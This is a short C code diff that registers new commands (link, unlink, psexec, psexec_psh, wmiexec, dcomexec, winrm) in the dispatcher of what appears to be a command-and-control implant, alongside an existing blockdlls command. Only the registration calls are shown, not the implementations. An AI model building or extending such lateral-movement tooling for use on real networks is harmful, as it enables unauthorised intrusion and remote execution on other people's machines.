@@ -122,6 +122,27 @@ VOID register_commands(PINSTANCE inst) {
 #ifdef INCLUDE_CMD_BLOCKDLLS
     _register(XSTR("blockdlls"), cmd_blockdlls);
 #endif
+#ifdef INCLUDE_CMD_LINK
+    _register(XSTR("link"), cmd_link);
+#endif
+#ifdef INCLUDE_CMD_UNLINK
+    _register(XSTR("unlink"), cmd_unlink);
+#endif
+#ifdef INCLUDE_CMD_PSEXEC
+    _register(XSTR("psexec"), cmd_psexec);
+#endif
+#ifdef INCLUDE_CMD_PSEXEC_PSH
+    _register(XSTR("psexec_psh"), cmd_psexec_psh);
+#endif
+#ifdef INCLUDE_CMD_WMIEXEC
+    _register(XSTR("wmiexec"), cmd_wmiexec);
+#endif
+#ifdef INCLUDE_CMD_DCOMEXEC
+    _register(XSTR("dcomexec"), cmd_dcomexec);
+#endif
+#ifdef INCLUDE_CMD_WINRM
+    _register(XSTR("winrm"), cmd_winrm);
+#endif
 }
 
 VOID dispatch_command(PINSTANCE inst, const char* cmd_name, BYTE* args, DWORD args_len,
